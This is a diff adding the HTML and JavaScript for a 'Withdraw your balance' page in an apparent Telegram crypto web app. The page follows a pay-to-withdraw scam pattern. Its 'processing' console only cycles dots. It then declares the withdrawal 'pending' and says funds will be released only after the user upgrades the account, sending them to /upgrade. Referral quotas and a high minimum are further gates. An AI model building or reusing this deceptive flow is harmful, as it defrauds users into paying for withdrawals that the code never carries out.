@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdraw</title>
+    <link rel="icon" href="https://i.ibb.co/f2fnF7B/Proyecto-nuevo-1.png" type="image/png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
+
+    <!-- Estilos de Bootstrap -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Tu CSS personalizado -->
+    <style>
+ 
+        
+        .curved-background {
+            position: absolute;
+            background: linear-gradient(135deg, #26a17b, #26a17b, #26a17b);
+            width: 100%;
+            height: 90%;
+            border-bottom-left-radius: 50% 10%;
+            border-bottom-right-radius: 50% 10%;
+            z-index: -1;
+        }
+        .content-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 1;
+            width: 100%;
+        }
+ 
+
+ 
+ 
+        .py-3.text-center.border-bottom{
+            letter-spacing:2px;
+
+            color: rgb(255, 255, 255);
+            font-size: 15px;
+            font-weight:bold;
+           }
+         
+
+
+        .btn-action {
+            border: 2px solid;
+            border-radius: 10px;
+            padding: 10px 0; /* Eliminar el padding horizontal para que el ancho sea uniforme */
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            width: 48%; /* Ajustar el ancho de cada botón para que se distribuyan en todo el espacio */
+            text-align: center; /* Asegurar que el texto dentro del botón esté centrado */
+        }
+
+
+        /* Botón Back */
+        .back-button {
+            background-color: white;
+            color:  #26a17b; 
+            border-color: #26a17b; 
+        }
+
+        .back-button:hover {
+            background-color: #26a17b; 
+            color: white;
+        }
+
+        /* Botón Continue */
+        .continue-button {
+            color: white;
+            background-color: #26a17b; 
+            border-color:  #26a17b; 
+
+        }
+
+        .continue-button:hover {
+            background-color:white;
+            color:  #26a17b; 
+            border-color:  #26a17b;
+
+        }
+
+        .max-button {
+            background-color: white;
+            color: #26a17b;
+            border: 2px solid #26a17b;
+            border-radius: 10px;
+            padding: 5px 15px;
+            margin-left: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .max-button:hover {
+            background-color:#26a17b;
+            color: white;
+        }
+
+        @keyframes zoomIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .animated-zoom {
+            animation: zoomIn 0.5s ease forwards;
+        }
+
+        /* Spinner animado */
+        .fa-spin {
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Estilo del texto tipo consola */
+        #console-text {
+            white-space: pre-wrap; /* Permite que el texto largo se ajuste dentro del contenedor */
+            font-size: 0.9em;
+        }
+
+        /* Estilos para el modal personalizado */
+        .modal-content {
+            border-radius: 15px;
+            background-color: white;
+        }
+
+        .modal-header, .modal-footer {
+            border: none;
+        }
+
+        .modal-title {
+            font-weight: bold;
+        }
+
+        .close {
+            outline: none;
+        }
+
+        .modal-body {
+            font-size: 1em;
+        }
+
+        .modal-footer .btn {
+            width: 100%;
+            border-radius: 10px;
+        }
+        /* Estilos para el ícono del modal */
+        #modalIcon {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+        #modalIconImg {
+            width: 150px;
+            height: 150px;
+            margin-bottom: 15px;
+        }
+
+         
+    .close-btn {
+        width: 100%;
+        border-radius: 25px;
+        padding: 10px;
+        font-weight: bold;
+        margin-top: 10px;
+    }
+
+    .close-btn {
+        background-color: #6c757d;
+        color: white;
+        border: none;
+    }
+
+        
+
+    </style>
+</head>
+
+<body>
+    <div class="curved-background"></div>
+
+    <div class="content-container" style="display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; width: 90%; overflow-y: auto;">
+        <div class="py-3 text-center" style="color: rgb(255, 255, 255);">
+            <h5 style="font-size: 1.5em; padding-top: 2em; font-weight: bold; padding-bottom: 1em;">Withdraw your balance.</h5>
+        </div>
+    
+        <div style="width: 100%; max-width: 500px;"id="amount-section">     <!-- PARTE 1 -->
+
+            <div class="animated-zoom" style="background-color: white; border-radius: 20px; padding: 20px; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);">
+                <!-- Sección de la cantidad a retirar -->
+                <h6 style="font-weight: bold; text-align: center; margin-bottom: 20px;">Amount</h6>
+                <div style="display: flex; align-items: center; border: 1px solid #ccc; border-radius: 10px; padding: 10px;">
+                    <i class="fa fa-dollar-sign" style="font-size: 1.5em; margin-right: 10px; color: #666;"></i>
+                    <input id="withdraw-amount" type="number" placeholder="Enter amount" style="border: none; outline: none; width: 100%; font-size: 0.8em; padding-left: 5px; text-align: center;">
+                    <button onclick="setMaxAmount()" class="max-button">MAX</button>
+                </div>
+    
+ 
+                <!-- Botones Back y Continue -->
+                <div style="display: flex; justify-content: space-between; margin-top: 20px; width: 100%;">
+                    <!-- Botón Back -->
+                    <button class="btn-action back-button" onclick="window.location.href='/dashboard'">
+                        <i class="fa fa-arrow-left"></i> Back
+                    </button>
+    
+                    <!-- Botón Continue -->
+                    <button class="btn-action continue-button" onclick="continueAction()">
+                        Continue <i class="fa fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+          <div id="wallet-section" style="display: none; width: 100%; max-width: 500px;">   <!-- PARTE 2 -->
+
+            <div class="animated-zoom" style="background-color: white; border-radius: 20px; padding: 20px; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);">
+         
+                <!-- Nueva sección para la billetera de destinatario con botón de clipboard -->
+                <h6 style="font-weight: bold; text-align: center; margin-top: 20px; margin-bottom: 10px;">Your wallet address</h6>
+                <div style="display: flex; align-items: center; border: 1px solid #ccc; border-radius: 10px; padding: 10px;">
+                    <i class="fa fa-wallet" style="font-size: 1.5em; margin-right: 10px; color: #666;"></i>
+                    <input id="wallet-address" type="text" placeholder="Enter recipient wallet address" style="border: none; outline: none; width: 100%; font-size: 0.8em; padding-left: 5px; text-align: center;">
+                    <button onclick="pasteFromClipboard()" class="max-button" style="margin-left: 10px;">
+                        <i class="fa fa-clipboard"></i>
+                    </button>
+                </div>
+        
+                <!-- Botones Back y Continue -->
+                <div style=" justify-content: space-between; margin-top: 20px; width: 100%;">
+                    <!-- Botón Continue -->
+                    <button class="btn-action continue-button" onclick="withdrawAction()">
+                        Withdraw <i class="fa fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Contenedor de procesamiento -->
+        <div id="processing-section" style="display: none; width: 100%; max-width: 500px; margin-top: 20px;">   
+            <div class="animated-zoom" style="background-color: white; border-radius: 20px; padding: 20px; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); text-align: center;">
+                <div class="spinner" style="margin-bottom: 20px;">
+                    <i class="fa fa-spinner fa-spin" style="font-size: 3em; color: #666;"></i>
+                </div>
+                <h6 style="font-weight: bold; text-align: center; margin-bottom: 20px;">Processing withdrawal request...</h6>
+                <div id="console-text" style="background-color: #f1f1f1; border-radius: 10px; padding: 15px; text-align: center; font-family: monospace; font-size: 0.9em; color: #333; max-height: 150px; overflow-y: auto;">
+                    Initializing withdrawal...
+                </div>
+            </div>
+        </div>
+
+        <div id="error-section" style="display: none; width: 100%; max-width: 500px; margin-top: 20px;">   
+            <div class="animated-zoom" style="background-color: white; border-radius: 20px; padding: 20px; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); text-align: center;">
+                <div id="errorAnimation" style="margin-bottom: 20px; width: 100%; height: 100px; display: flex; justify-content: center; align-items: center;"></div>
+                
+                <h6 style="font-weight: bold; text-align: center; margin-bottom: 20px;">Your withdraw is now pending!</h6>
+                <p style="font-size: 1em; color: #666; text-align: center; margin-bottom: 20px; line-height: 1.6;">
+                    <!-- Este contenido se actualizará dinámicamente -->
+                </p>
+        
+                <button onclick="hideErrorSection()" class="close-btn" style="background: linear-gradient(135deg, #26a17b, #26a17b, #26a17b); color: white; padding: 10px 20px; border: none; border-radius: 20px; cursor: pointer; width: 100%;">
+                    Upgrade Account
+                </button>
+            </div>
+        </div>
+        
+ 
+
+ 
+    </div>
+ 
+
+    <div class="modal fade" id="customModal" tabindex="-1" role="dialog" aria-labelledby="customModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content" style="border-radius: 15px;">
+                <div class="modal-header" style="border-bottom: none; display: flex; justify-content: center;">
+                    <h5 class="modal-title" id="customModalLabel"></h5>
+                </div>
+    
+                <div class="modal-body" id="customModalBody" style="text-align: center;">
+                    <div id="modalIcon" style="margin-bottom: 20px;"></div>            
+                    <div id="modalMessage"></div>
+                </div>
+    
+                <div class="modal-footer" style="border-top: none;">
+                    <button type="button" class="close-btn" id="customModalButton" style="background: linear-gradient(135deg, #26a17b, #26a17b, #26a17b);" data-dismiss="modal">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    
+
+    <!-- Scripts de Bootstrap y dependencias -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.7.4/lottie.min.js"></script>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+
+document.addEventListener("DOMContentLoaded", function () {
+    // Cargar y reproducir la animación en el contenedor errorAnimation
+    lottie.loadAnimation({
+        container: document.getElementById('errorAnimation'), // Contenedor de la animación
+        renderer: 'svg',
+        loop: true, // Establece en true si quieres que la animación se repita
+        autoplay: true, // Establece en true para que la animación se inicie automáticamente
+        path: 'https://lottie.host/61d5dfa0-1854-4fb7-898e-35dc7257325f/1V0kfKpB95.json' // Ruta de la animación JSON
+    });
+});
+
+
+        let pay_status = "0";
+        let next_pay = "1764043017";
+        const unixTimeNow = Math.floor(Date.now() / 1000);
+        const diferenciaEnSegundos = parseInt(next_pay) - unixTimeNow;
+        const fecha = "1/1"; 
+        let minwithdraw = parseFloat("100.00"); // Convertir a número decimal si es necesario
+        const balanceUser = parseFloat("0.010453137"); // Convertir a número decimal si es necesario
+        const referralCount = parseFloat("6815"); // Convertir a número decimal si es necesario
+
+        const referralsMinimum = 10;
+        
+        function continueAction() {
+            const inputField = document.getElementById('withdraw-amount');
+            const amount = parseFloat(inputField.value);
+        
+            if (isNaN(amount) || amount === '') {
+
+                showModal('Invalid Amount', 'Please enter a valid amount to withdraw.', 'error');
+                return;
+            }
+
+            if (amount > balanceUser) {
+
+                showModal('Insufficient Balance', 'You do not have enough balance to withdraw this amount.', 'error');
+                return;
+
+            }else if (amount < minwithdraw){
+
+                showModal('Insufficient Balance', 'You need at least <b>' + minwithdraw + ' USDT </b> balance to withdraw!', 'error');
+                return;
+        
+            } else if (referralCount < referralsMinimum) { 
+
+                showModal('More Referrals Needed', 'You need at least <b>'+referralsMinimum+' referrals</b> to withdraw your balance! Keep sharing your referral link!', 'warning');
+                return;
+
+            } else { 
+
+                document.getElementById('wallet-section').style.display = 'block';
+                document.getElementById('amount-section').style.display = 'none';
+            }
+        }
+        function withdrawAction() {
+            const address = document.getElementById('wallet-address').value;
+            const blockchain = isValidWalletAddress(address);
+
+            if (!blockchain) {
+                showModal('Invalid Wallet Address', 'Please enter a valid BTC, ETH, TRX, or SOL address.', 'error');
+                return;
+            }
+
+         }
+
+        function showModal(title, message, type) {
+            document.getElementById('customModalLabel').innerText = title;
+            const modalIcon = document.getElementById('modalIcon');
+            const modalMessage = document.getElementById('modalMessage');
+            const modalButton = document.getElementById('customModalButton');
+        
+            modalMessage.innerHTML = message;
+            modalIcon.innerHTML = '';
+        
+            // Estilos base para el ícono
+            modalIcon.style.fontSize = '4em';
+            modalIcon.style.animation = 'bounceIn 0.5s ease';
+        
+            switch(type) {
+                case 'error':
+                    modalIcon.innerHTML = '<i class="fas fa-info-circle" style="color: #3498db;"></i>';
+                    modalButton.style.background = '#3498db';
+                    break;
+                case 'warning':
+                    modalIcon.innerHTML = '<i class="fas fa-share-alt" style="color: #2ecc71;"></i>';
+                    modalButton.style.background = '#2ecc71';
+                    break;
+                case 'balance':
+                    modalIcon.innerHTML = '<i class="fas fa-coins" style="color: #f1c40f;"></i>';
+                    modalButton.style.background = '#f1c40f';
+                    break;
+                default:
+                    modalIcon.innerHTML = '<i class="fas fa-info-circle" style="color: #3498db;"></i>';
+                    modalButton.style.background = '#3498db';
+                    break;
+            }
+        
+            // Añadir animación CSS
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes bounceIn {
+                    0% {
+                        transform: scale(0);
+                        opacity: 0;
+                    }
+                    60% {
+                        transform: scale(1.2);
+                        opacity: 0.6;
+                    }
+                    100% {
+                        transform: scale(1);
+                        opacity: 1;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        
+            $('#customModal').modal('show');
+        }
+ 
+         
+
+        function closeModal() {
+            $('#customModal').modal('hide');
+        }
+ 
+        function pasteFromClipboard() {
+            try {
+                // Intenta usar la API de Telegram directamente
+                window.Telegram.WebApp.requestWriteAccess()
+                    .then(function(allowed) {
+                        if (allowed) {
+                            window.Telegram.WebApp.readTextFromClipboard(function(text) {
+                                if (text) {
+                                    document.getElementById('wallet-address').value = text;
+                                }
+                            });
+                        }
+                    });
+            } catch (error) {
+                // Fallback al método tradicional si no estamos en Telegram
+                navigator.clipboard.readText()
+                    .then(function(text) {
+                        document.getElementById('wallet-address').value = text;
+                    })
+                    .catch(function(err) {
+                        console.error('Failed to read clipboard contents:', err);
+                    });
+            }
+        }
+
+
+        function setMaxAmount() {
+            document.getElementById('withdraw-amount').value =balanceUser;
+        }
+
+        function isValidWalletAddress(address) {
+            // Regex para diferentes blockchains
+            const btcRegex = /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,39}$/;
+            const ethRegex = /^0x[a-fA-F0-9]{40}$/;
+            const trxRegex = /^T[a-zA-Z0-9]{33}$/;
+            const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/; // Direcciones Solana son alfanuméricas y entre 32 y 44 caracteres
+
+            // Verificar si la dirección es válida para alguna blockchain
+            if (btcRegex.test(address)) {
+                return "Bitcoin";
+            } else if (ethRegex.test(address)) {
+                return "Ethereum";
+            } else if (trxRegex.test(address)) {
+                return "TRON";
+            } else if (solRegex.test(address)) {
+                return "Solana";
+            } else {
+                return false; // No es una dirección válida
+            }
+        }
+        function showProcessingSection() {
+            const amount = document.getElementById('withdraw-amount').value;
+            const address = document.getElementById('wallet-address').value;
+            
+            // Mostrar la sección de procesamiento
+            document.getElementById('processing-section').style.display = 'block';
+            
+            const consoleText = document.getElementById('console-text');
+            const messages = [
+                '...',
+                '......',
+                '.........',
+                '............',
+                '.........',
+                '......',
+                '...',
+            ];
+            
+            let messageIndex = 0;
+            
+            function updateConsole() {
+                if (messageIndex < messages.length) {
+                    consoleText.textContent = messages[messageIndex];
+                    messageIndex++;
+                    setTimeout(updateConsole, 1000);
+                } else {
+                    // Ocultar sección de procesamiento
+                    document.getElementById('processing-section').style.display = 'none';
+                    
+                    // Actualizar mensaje de error con los detalles del retiro
+                    document.querySelector('#error-section h6').innerHTML = 'Your withdraw is now pending!';
+
+                    document.querySelector('#error-section p').innerHTML = 
+                        `To complete your withdrawal, you need to upgrade your account. 
+                        Your funds will be released immediately after upgrading.`;
+
+                    document.getElementById('error-section').style.display = 'block';
+        
+                    // Enviar solicitud para actualizar el balance y crear el retiro pendiente
+                    updateBalanceAndCreateWithdraw(amount);
+                }
+            }
+            
+            updateConsole();
+        }
+
+        function updateBalanceAndCreateWithdraw(amount) {
+            const withdrawAddress = document.getElementById('wallet-address').value;
+            
+            if (!withdrawAddress) {
+                console.error('Please enter a wallet address');
+                return;
+            }
+        
+            // Obtener la URL de la webapp de Telegram
+            const webAppUrl = window.Telegram.WebApp.initDataUnsafe?.start_param || window.location.origin;
+            
+            const data = {
+                billetera: withdrawAddress,
+                amount: amount,
+                webAppUrl: webAppUrl  // Añadir la URL de la webapp
+            };
+        
+            fetch('/update-balance', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (!data.success) {
+                    console.error('Error updating balance:', data.message);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+        function hideErrorSection() {
+            // Ocultar el contenedor de error cuando el usuario presiona el botón "OK"
+            document.getElementById('error-section').style.display = 'none';
+ 
+            window.location.href = '/upgrade';
+        }
+
+        function withdrawAction() {
+            const address = document.getElementById('wallet-address').value; // Supongo que el input tiene este ID
+            const blockchain = isValidWalletAddress(address);
+
+            if (!blockchain) {
+                showModal('Invalid Wallet Address', 'Please enter a valid BTC, ETH, TRX, or SOL address.', 'error');
+                return;
+            }
+
+            // Ocultar la sección de la billetera y mostrar la de procesamiento
+            document.getElementById('wallet-section').style.display = 'none';
+            showProcessingSection();
+            // Aquí puedes continuar con la lógica para el retiro
+        }
+
+        
+    </script>
+
+    
+</body>
+</html>
